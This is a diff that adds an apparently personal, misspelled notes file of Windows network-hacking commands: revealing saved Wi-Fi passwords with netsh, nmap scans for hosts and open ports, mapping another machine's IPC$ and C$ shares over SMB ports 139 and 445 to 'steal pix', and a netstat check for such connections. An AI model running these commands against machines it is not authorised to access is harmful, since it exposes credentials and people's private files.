@@ -1,0 +1,21 @@
+STEP1
+
+step2
+S-A-SA-E
+
+how to get wifi passowrd locally/network - netsh wlan show profile name="wifiname" key=clear
+
+nmap -sP 10.3.3.0/24 - to see macadd
+nmap -v ip - to see open port
+
+how to steal pix attack port 139 + 445
+
+net use \\ip\ipc$
+
+net use x: \\ip\c$
+
+how to know if youre attaked
+
+netstat -n -p tcp | findstr 445
+
+1326 - hotline
